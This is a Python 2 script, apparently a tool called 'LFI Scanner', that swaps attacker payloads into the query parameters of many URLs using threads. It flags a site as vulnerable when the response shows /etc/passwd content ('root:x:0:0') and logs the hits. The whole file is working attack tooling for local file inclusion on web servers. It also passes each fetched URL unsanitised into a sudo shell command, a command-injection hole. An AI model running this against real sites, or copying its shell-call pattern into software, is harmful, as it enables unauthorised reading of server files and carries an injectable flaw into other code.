#!/usr/bin/python

import sys
import pycurl
import os
import random
import time
import urlparse
import argparse
from StringIO import StringIO
from colorama import Style,Fore
from multiprocessing import Pool


def fuzz(url):
		try:
			url = url.split()[0]
			parsed = urlparse.urlparse(url)
			pf = open('parameters.txt', 'r')
                	parameters = pf.readlines()
			for parm in parameters:
				try:
					parm = parm.split()[0]
                        		p = urlparse.parse_qs(parsed.query)[parm]
					for i in p:
						plist = open(args.payloads, 'r')
		                      	  	for payload in plist.readlines():
        		                        	payload = payload.split()[0]
							f = url.replace(i, str(payload))
							try:
							

								print Fore.WHITE + "[" + Fore.CYAN + "+" + Fore.WHITE + "] " + Fore.BLUE + "Testing " + Fore.WHITE + f   
								buffer = StringIO()
								c = pycurl.Curl()
								c.setopt(c.URL, f)
								c.setopt(c.WRITEDATA, buffer)
								c.perform()
								c.close()
								text = buffer.getvalue()
								if text.find("root:x:0:0") != -1:
										print Fore.WHITE + "[" + Fore.GREEN + Style.BRIGHT + "*" + Fore.WHITE + "] " + Fore.GREEN + "B00M!! " + Fore.CYAN + f + " VULNERABLE"
										os.system("sudo echo '%s' >> %s" % (f, args.output))
										print Fore.WHITE + Style.BRIGHT + "\n" + text

								
								plist.close()	
							except:
								plist.close()
								pass

				except:	
					pass
		except KeyboardInterrupt:
			print Fore.RED + Style.BRIGHT + "\n[!] Done.. Exiting"
			sys.exit(1)		
					

def run(args):
		try:
			print Style.BRIGHT + Fore.WHITE + "[" + Fore.BLUE + "+" + Fore.WHITE + "] Testing With Threads " + Fore.CYAN + str(args.threads) + "\n\n"
			time.sleep(2)
			pool = Pool(int(args.threads))
			with open(args.urls) as url:
				results = pool.map(fuzz, url, int(args.threads))
		except KeyboardInterrupt:
			print Fore.RED + Style.BRIGHT + "\n[!] Done.. Exiting"
                        sys.exit(1)

print Style.BRIGHT + Fore.CYAN + """

 ___      _______  ___  
|   |    |       ||   | 
|   |    |    ___||   | 
|   |    |   |___ |   | 
|   |___ |    ___||   | 
|       ||   |    |   | 
|_______||___|    |___| 

""" + Fore.YELLOW + "\t@z0idex\n\n" + Fore.WHITE


parser = argparse.ArgumentParser(description='LFI Scanner')
parser.add_argument('-u', '--urls', help="The list of urls", required=True)
parser.add_argument('-p', '--payloads', help='The list of payloads', required=True)
parser.add_argument('-t', '--threads', help='The number of threads', required=True)
parser.add_argument("-o", "--output", help="output to a file", required=True)
global args
args = parser.parse_args()

if args.urls != None and args.payloads != None and args.threads != None:
	run(args)		

